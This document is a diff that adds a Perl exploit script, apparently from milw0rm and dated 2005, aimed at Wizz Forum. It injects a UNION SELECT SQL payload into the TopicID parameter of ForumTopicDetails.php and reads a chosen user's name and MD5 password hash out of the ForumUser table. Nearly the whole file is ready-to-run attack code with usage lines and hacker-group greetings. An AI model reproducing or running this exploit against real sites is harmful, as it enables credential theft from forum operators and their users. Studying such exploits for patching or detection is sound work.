@@ -1,0 +1,45 @@
+#!/bin/env perl
+#//-----------------------------------------------------------#
+#//        Wizz Forum SQL Injection Exploit .. By HACKERS PAL
+#//                   Greets For Devil-00 - Abducter - Almaster
+#//                          http://WwW.SoQoR.NeT
+#//-----------------------------------------------------------#
+
+use LWP::Simple;
+
+print "\n#####################################################";
+print "\n#        Wizz Forum Exploit By : HACKERS PAL        #";
+print "\n#               Http://WwW.SoQoR.NeT                #";
+
+if(!$ARGV[0] or !$ARGV[1]) {
+print "\n# -- Usage:                                         #";
+print "\n# -- perl $0 [Full-Path] [User ID]              #";
+print "\n# -- Example:                                       #";
+print "\n# -- perl $0 http://vubb.com/forum/1            #";
+print "\n#     Greets To Devil-00 - Abducter - almastar      #";
+print "\n#####################################################";
+   exit(0);
+}
+else
+{
+print "\n#     Greets To Devil-00 - Abducter - almastar      #";
+print "\n#####################################################";
+
+       $web=$ARGV[0];
+       $id=$ARGV[1];
+$url = "ForumTopicDetails.php?TopicID=-10%20union%20select%20userid,password,password,userid,joindate,4444444,4444444%20from%20ForumUser%20where%20user_index=$id";
+           $site="$web/$url";
+$page = get($site) || die "[-] Unable to retrieve: $!";
+print "\n[+] Connected to: $ARGV[0]\n";
+
+print "[+] User ID is : $id ";
+$page =~ m/<td width='100%' colspan='3'><font face='Arial' size='2'>(.*?)<\/font><\/td>/ && print "\n[+] User Name is: $1\n";
+print "\n[-] Unable to retrieve User Name\n" if(!$1);
+$page =~ m/<font face='Arial' size='4'>Topic: (.*?)<\/font>/ && print "[+] MD5 hash of password is: $1\n";
+print "[-] Unable to retrieve hash of password\n" if(!$1);
+
+}
+
+# Finished
+
+# milw0rm.com [2005-11-14]
